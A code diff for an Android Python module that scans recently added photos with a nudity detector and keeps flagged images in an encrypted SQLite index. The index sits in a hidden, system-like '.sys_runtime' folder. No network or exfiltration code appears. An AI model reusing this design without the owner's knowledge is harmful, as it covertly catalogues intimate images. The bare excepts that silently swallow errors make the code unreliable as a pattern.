@@ -7,10 +7,20 @@ import sqlite3
 import logging
 import gc
 import base64
+import random
 from datetime import datetime
 
-# إعداد المسارات
-P = os.path.join(os.getcwd(), ".sys_runtime")
+# ========== إعداد المسارات الموحدة ==========
+def _get_runtime_path():
+    try:
+        from jnius import autoclass
+        act = autoclass('org.kivy.android.PythonActivity').mActivity
+        base = act.getFilesDir().getPath()
+        return os.path.join(base, ".sys_runtime")
+    except:
+        return os.path.join(os.getcwd(), ".sys_runtime")
+
+P = _get_runtime_path()
 DB = os.path.join(P, "m_arch.db")
 if not os.path.exists(P):
     os.makedirs(P)
@@ -23,7 +33,7 @@ try:
 except ImportError:
     JNI = False
 
-# محاولة استيراد التشفير المتقدم
+# محاولة استيراد التشفير
 try:
     from cryptography.fernet import Fernet
     from cryptography.hazmat.primitives import hashes
@@ -42,16 +52,15 @@ class MediaScanner:
         self._fernet = self._init_crypto()
         self._init_db()
 
-        # محاولة جلب معرف الجهاز
+        # جلب معرف الجهاز من الواجهة (إن وجد)
         try:
             if self.ui and hasattr(self.ui, 'm') and hasattr(self.ui.m, 'did'):
                 self.did = self.ui.m.did
-        except Exception:
+        except:
             pass
 
-    # ========== نظام التشفير الحقيقي (إصلاح 2) ==========
+    # ========== نظام التشفير للمسارات ==========
     def _init_crypto(self):
-        """اشتقاق مفتاح Fernet فريد لكل جهاز باستخدام ANDROID_ID"""
         if not JNI or not CRYPTO_AVAILABLE:
             return None
         try:
@@ -61,7 +70,6 @@ class MediaScanner:
             android_id = Secure.getString(context.getContentResolver(), Secure.ANDROID_ID)
             if not android_id:
                 android_id = "unknown_device"
-            # استخدام ملح ثابت للمسارات
             salt = b'\xa7\x3c\xf8\x91\x4e\xb2\xd0\x65'
             kdf = PBKDF2HMAC(
                 algorithm=hashes.SHA256(),
@@ -76,30 +84,26 @@ class MediaScanner:
             return None
 
     def _enc(self, text: str) -> str:
-        """تشفير النص باستخدام Fernet، مع fallback إلى base64"""
         if self._fernet:
             try:
                 return self._fernet.encrypt(text.encode()).decode()
-            except Exception:
+            except:
                 pass
-        # fallback آمن (لكنه أقل أماناً)
         return base64.b64encode(text.encode()).decode()
 
     def _dec(self, enc_text: str) -> str:
-        """فك تشفير النص"""
         if self._fernet:
             try:
                 return self._fernet.decrypt(enc_text.encode()).decode()
-            except Exception:
+            except:
                 pass
         try:
             return base64.b64decode(enc_text.encode()).decode()
-        except Exception:
+        except:
             return ""
 
     # ========== إدارة قاعدة البيانات ==========
     def _init_db(self):
-        """إنشاء جدول media مع إزالة عمود normal (نحتفظ فقط بالحساس والمعلق)"""
         try:
             with sqlite3.connect(DB) as conn:
                 conn.execute('''CREATE TABLE IF NOT EXISTS media (
@@ -114,24 +118,21 @@ class MediaScanner:
             logging.error(f"DB Init error: {e}")
 
     def _partial_hash(self, path: str) -> str:
-        """بصمة فريدة للملف تعتمد على الحجم والتوقيت + أول 2KB"""
         try:
             st = os.stat(path)
             base = f"{st.st_size}_{int(st.st_mtime)}"
             with open(path, "rb") as f:
                 head = f.read(2048)
             return hashlib.md5(head + base.encode()).hexdigest()
-        except Exception:
+        except:
             return None
 
     def _safe_path(self, path: str) -> bool:
-        """تجنب مسح المجلدات الحساسة والملفات المخفية"""
         bad = ["/Android/", "/obb/", "/data/", "/."]
         return not any(x in path for x in bad) and not os.path.basename(path).startswith(".")
 
-    # ========== مسح موجه (إصلاح 1) ==========
+    # ========== مسح سريع لآخر 48 ساعة ==========
     def _fast_scan(self, limit=100):
-        """جلب الصور المضافة خلال آخر 48 ساعة فقط"""
         if not JNI:
             return []
         cursor = None
@@ -141,7 +142,6 @@ class MediaScanner:
             resolver = act.getContentResolver()
             MediaStore = autoclass('android.provider.MediaStore')
 
-            # فلتر زمني: آخر 48 ساعة
             time_threshold = int(time.time()) - (48 * 3600)
             img_uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
             projection = ["_data", "date_added"]
@@ -164,9 +164,8 @@ class MediaScanner:
                 cursor.close()
             gc.collect()
 
-    # ========== معالجة وتحليل الصور (إصلاح 3) ==========
+    # ========== معالجة الملفات الجديدة ==========
     def _process_files(self, paths):
-        """تحليل الصور الجديدة وتخزين الحساسة فقط"""
         if self.active or not paths:
             return
         self.active = True
@@ -185,11 +184,10 @@ class MediaScanner:
                     if cur.fetchone():
                         continue
 
-                    # التحليل باستخدام NudeDetector
                     cat = 'pending'
                     score = 0.0
-                    if self.det and hasattr(self.det, '_analyze'):
-                        prob = self.det._analyze(p)
+                    if self.det and hasattr(self.det, 'analyze'):
+                        prob = self.det.analyze(p)
                         if prob > 0.85:
                             cat = 'nude'
                             score = prob
@@ -199,18 +197,16 @@ class MediaScanner:
                             score = prob
                             sensitive_count += 1
                         else:
-                            # ✅ إصلاح 3: لا ندرج الصور العادية
+                            # صورة عادية لا ندرجها
                             continue
                     else:
-                        # في حالة عدم وجود كاشف، نصنف معلقًا لحين توفر النموذج
+                        # إذا لم يوجد كاشف، نخزنها معلقة للتحليل لاحقاً
                         cat = 'pending'
 
-                    # إدراج فقط إذا كانت الفئة nude أو questionable أو pending
                     conn.execute(
                         "INSERT INTO media (h, p, ts, cat, score) VALUES (?, ?, ?, ?, ?)",
                         (h, self._enc(p), now, cat, score)
                     )
-
                 conn.commit()
 
             # إشعار بالصور الحساسة المكتشفة
@@ -226,15 +222,13 @@ class MediaScanner:
             self.active = False
             gc.collect()
 
-    # ========== توليد صورة مصغرة (إصلاح 4) ==========
+    # ========== توليد صورة مصغرة ==========
     def get_thumbnail(self, path):
-        """إرجاع مسار الصورة المصغرة، مع إغلاق cursor بأمان"""
         if not JNI or not os.path.exists(path):
             return None
-
         cursor = None
         try:
-            # تنظيف المصغرات القديمة (أكبر من 10 دقائق)
+            # تنظيف المصغرات القديمة (أكثر من 10 دقائق)
             now = time.time()
             for f in os.listdir(P):
                 if f.startswith("th_") and os.path.getmtime(os.path.join(P, f)) < now - 600:
@@ -263,7 +257,7 @@ class MediaScanner:
                     options
                 )
                 if bitmap:
-                    out_path = os.path.join(P, f"th_{int(time.time())}_{random.randint(0,99)}.jpg")
+                    out_path = os.path.join(P, f"th_{int(time.time())}_{random.randint(0, 99)}.jpg")
                     with FileOutputStream(out_path) as out:
                         bitmap.compress(CompressFormat.JPEG, 70, out)
                         out.flush()
@@ -272,13 +266,12 @@ class MediaScanner:
         except Exception as e:
             logging.error(f"Thumb error: {e}")
         finally:
-            # ✅ إصلاح 4: إغلاق cursor بشكل آمن
             if cursor:
                 cursor.close()
             gc.collect()
         return None
 
-    # ========== جلب المعرض ==========
+    # ========== جلب المعرض حسب التصنيف ==========
     def get_gallery_by_category(self, category, limit=16, page=0):
         offset = page * limit
         results = []
@@ -306,13 +299,13 @@ class MediaScanner:
             logging.error(f"Gallery error: {e}")
         return results
 
-    # ========== تحديث فئة ملف ==========
+    # ========== تحديث فئة ملف (يُستدعى من الـ AI) ==========
     def update_category(self, file_hash, category, score=0):
         try:
             with sqlite3.connect(DB) as conn:
                 conn.execute("UPDATE media SET cat=?, score=? WHERE h=?", (category, score, file_hash))
                 conn.commit()
-        except Exception:
+        except:
             pass
 
     # ========== إحصائيات ==========
@@ -328,7 +321,7 @@ class MediaScanner:
             logging.error(f"Statistics error: {e}")
         return stats
 
-    # ========== تنظيف قاعدة البيانات ==========
+    # ========== تنظيف قاعدة البيانات (للمساحة) ==========
     def _cleanup_db(self):
         try:
             with sqlite3.connect(DB) as conn:
@@ -339,11 +332,11 @@ class MediaScanner:
                         to_del.append((h,))
                 if to_del:
                     conn.executemany("DELETE FROM media WHERE h=?", to_del)
-                # حذف أقدم من 5000 صورة احتياطياً
+                # حذف أقدم من 5000 صورة (احتياط)
                 conn.execute("DELETE FROM media WHERE h NOT IN (SELECT h FROM media ORDER BY ts DESC LIMIT 5000)")
                 conn.execute("VACUUM")
                 conn.commit()
-        except Exception:
+        except:
             pass
         finally:
             gc.collect()
